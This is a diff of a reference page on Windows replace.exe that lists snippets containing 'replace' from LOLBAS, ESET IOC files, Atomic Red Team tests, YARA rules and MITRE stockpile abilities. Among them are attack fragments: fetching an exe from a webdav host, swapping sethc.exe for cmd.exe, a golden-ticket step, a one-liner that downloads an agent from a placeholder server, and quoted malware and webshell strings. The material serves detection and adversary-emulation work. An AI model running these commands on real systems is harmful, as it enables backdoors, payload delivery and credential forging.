+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/ROCCAT_Swarm.yml">ROCCAT_Swarm.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">Replace ROCCAT_Swarm_Monitor.exe with your binary.exe</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Name</span><span class="pi">:</span> <span class="s">Replace.exe</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">Used to replace file with another file</span> </code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">replace.exe C:\Source\File.cab C:\Destination /A</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">C:\Windows\System32\replace.exe</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">C:\Windows\SysWOW64\replace.exe</span></code> | 
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">IOC</span><span class="pi">:</span> <span class="s">Replace.exe getting files from remote server</span></code> | 
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json">misp_invisimole.json</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"description"</span><span class="err">:</span> <span class="s">"Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program."</span><span class="p">,</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/kryptocibule/nouns.txt">nouns.txt</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="ni">replace</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc">stantinko</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="ni">var</span> <span class="err">c</span> <span class="err">=</span> <span class="err">a[b].</span><span class="ni">toLocaleLowerCase</span><span class="p">()</span><span class="err">.</span><span class="ni">replace</span><span class="p">(/(</span><span class="err">\n</span><span class="p">)/</span><span class="err">g</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span><span class="err">.</span><span class="ni">replace</span><span class="p">(/(</span><span class="err">\r</span><span class="p">)/</span><span class="err">g</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="c">;</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc">stantinko</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">a</span> <span class="err">=</span> <span class="err">a.</span><span class="ni">toLowerCase</span><span class="p">()</span><span class="err">.</span><span class="ni">replace</span><span class="p">(/(</span><span class="err">\n</span><span class="p">)/</span><span class="err">g</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span><span class="err">.</span><span class="ni">replace</span><span class="p">(/(</span><span class="err">\r</span><span class="p">)/</span><span class="err">g</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="c">;</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/turla/misp-turla-outlook-event.json">misp-turla-outlook-event.json</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"description"</span><span class="err">:</span> <span class="s">"The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system.[[Citation: Microsoft Component Object Model]] Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[[Citation: GDATA COM Hijacking]] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\n\nDetection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within &lt;code&gt;HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&lt;\/code&gt; may be anomalous and should be investigated since user objects will be loaded prior to machine objects in &lt;code&gt;HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\&lt;\/code&gt;.[[Citation: Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10\n\nData Sources: Windows Registry, DLL monitoring, Loaded DLLs\n\nContributors: ENDGAME"</span><span class="p">,</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/eset/malware-ioc">malware-ioc</a> | <a href="https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc">windigo</a> | <code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="kd">replace:</span></code> | <a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a> | ℹ Please replace this with what you did. | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a> | ℹ Please replace this with what you expected to happen. | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a> | ℹ Please replace this with of what happened instead. | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a> | - Atomic Test #2: Replace binary of sticky keys [windows] | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a> | - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md">linux-index.md</a> | - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/macos-index.md">macos-index.md</a> | - Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux] | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a> | - Atomic Test #2: Replace binary of sticky keys [windows] | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a> | $cleanupUpdatedValue = $cleanupUpdatedValue -replace ‘,NPPSpy’,’’ | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md">T1003.001.md</a> | $realDownloadUrl =$realTagUrl.Replace(‘tag’,’download’) + ‘/’ + $fileName | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md">T1053.003.md</a> | - <a href="#atomic-test-1---cron---replace-crontab-with-referenced-file">Atomic Test #1 - Cron - Replace crontab with referenced file</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md">T1053.003.md</a> | ## Atomic Test #1 - Cron - Replace crontab with referenced file | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md">T1070.006.md</a> | | target_date_time | Date/time to replace original timestamps with | String | 01/01/1970 00:00:00| | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md">T1098.md</a> | $account = $member.Name -replace “.+\",”” # strip computername\ | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a> | - <a href="#atomic-test-2---replace-binary-of-sticky-keys">Atomic Test #2 - Replace binary of sticky keys</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a> | ## Atomic Test #2 - Replace binary of sticky keys | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a> | Replace sticky keys binary (sethc.exe) with cmd.exe | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md">T1547.009.md</a> | Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.&lt;/blockquote&gt; | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.md">T1558.001.md</a> | “@ -Replace “DOMAIN_SID”, $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.md">T1564.md</a> | $macro = $macro -replace “aREPLACEMEa”, “PathToAtomicsFolder\T1564\bin\extractme.bin” | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a> | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md">T1574.001.md</a> | Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.&lt;/blockquote&gt; | <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | [apt_apt29<em>grizzly_steppe.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt29_grizzly_steppe.yar) | $s2 = “Repeat last find command)Replace specific text with different text” fullword wide | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $x1 = “Get-Content $env:Public\Libraries\update.vbs) -replace” ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $x3 = “CreateObject("WScript.Shell").Run Replace(DownloadExecute,"-</em>","bat")” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $s4 = “’) -replace ‘<strong>’,(‘DNS’+$id) | “ fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $s7 = “’) -replace ‘</strong>’,(‘HTP’+$id) | “ fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $x1 = “wss.Run "powershell.exe " &amp; Chr(34) &amp; "&amp; {(Get-Content $env:Public\Libraries\update.vbs) -replace ‘<em>_’,(Get-Random) | Set-C” ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $x1 = “(Get-Content $env:Public\Libraries\dns.ps1) -replace (‘#’+’##’),$botid | Set-Content $env:Public\Libraries\dns.ps1” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a> | $one5 = “cu = Replace(cu, "$", "")” ascii wide | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_winnti_hdroot.yar">apt_winnti_hdroot.yar</a> | $s8 = “tera replace dll config” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar">cn_pentestset_webshells.yar</a> | $s2 = “strReturn=Replace(strReturn,chr(43),"%2B")  ‘JMDCW” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/crime_goldeneye.yar">crime_goldeneye.yar</a> | $x1 = “fso.GetTempName();tmp_path = tmp_path.replace(‘.tmp’, ‘.exe’)” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar">gen_cert_payloads.yar</a> | $fp1 = “replace it with the PEM-encoded root certificate” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_fireeye_redteam_tools.yar">gen_fireeye_redteam_tools.yar</a> | $s2 = “[1].replace(‘unsigned char buf[] = "’” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_invoke_thehash.yar">gen_invoke_thehash.yar</a> | $s1 = “$process_ID = $process_ID -replace "-00-00",""” fullword ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mimikatz.yar">gen_mimikatz.yar</a> | $x9 = “\</em> <em>Password replace -&gt;” fullword wide ascii | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_empire.yar">gen_powershell_empire.yar</a> | $s3 = “$PersistantScript = $PersistantScript.ToString().Replace(‘EXECUTEFUNCTION’, "$PersistenceScriptName -Persist")” fullword ascii  | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s3 = “MorfiCoder=Replace(Replace(StrReverse(Code),"/</em>/",""""),"\*\",vbCrlf)” fullword | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s4 = “echo " &lt;a href=""/"&amp;encodeForUrl(theHref,false)&amp;""" target=_blank&gt;"&amp;replace” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s8 = “theHref=mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2)” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s3 = “echo " &lt;a href=""/"&amp;encodeForUrl(theHref,false)&amp;""" target=_blank&gt;"&amp;replace” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s9 = “theHref=mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2)” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s3 = “If ProxyData &lt;&gt; "" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, "<br />")” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s7 = “theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath("/")),"")” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/Neo23x0/signature-base">signature-base</a> | <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a> | $s8 = “Obviously you replace the ip address with that of the target.” | <a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a>
+<a href="https://github.com/mitre/stockpile">stockpile</a> | <a href="https://github.com/mitre/stockpile/blob/master/data/abilities/lateral-movement/3734aa1e-c536-42b3-8912-4c91b8bdce90.yml">3734aa1e-c536-42b3-8912-4c91b8bdce90.yml</a> | <code class="language-plaintext highlighter-rouge">($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("</code>””,””))<code class="language-plaintext highlighter-rouge">{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
+[stockpile](https://github.com/mitre/stockpile) | [52771610-2322-44cf-816b-a7df42b4c086.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/persistence/52771610-2322-44cf-816b-a7df42b4c086.yml) | </code>name: Replace a service binary with alternate binary<code class="language-plaintext highlighter-rouge">{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
+[stockpile](https://github.com/mitre/stockpile) | [e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml) | </code>$url=”#{server}/file/download”; $wc=New-Object System.Net.WebClient; $wc.Headers.add(“platform”,”windows”); $wc.Headers.add(“file”,”sandcat.go”); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[“Content-Disposition”].Substring($wc.ResponseHeaders[“Content-Disposition”].IndexOf(“filename=”)+9).Replace(“<code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s2">"</span><span class="s">"</span><span class="err">,</span><span class="s2">"</span><span class="s">"); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);</span></code> | <a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a>
+<a href="https://github.com/mitre/stockpile">stockpile</a> | <a href="https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml">e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml</a> | <code class="language-plaintext highlighter-rouge">$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("</code>””,””);`{:.highlight .language-yaml} | <a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></p>
 
 <h2 id="additional-info">Additional Info*</h2>
 
@@ -851,7 +546,7 @@ You can use the ERRORLEVEL parameter on the <strong>if</strong> command line in 
 
 <hr />
 
-<p>MIT License. Copyright (c) 2020 Strontic.</p>
+<p>MIT License. Copyright (c) 2020-2021 Strontic.</p>
 
 
     </section>
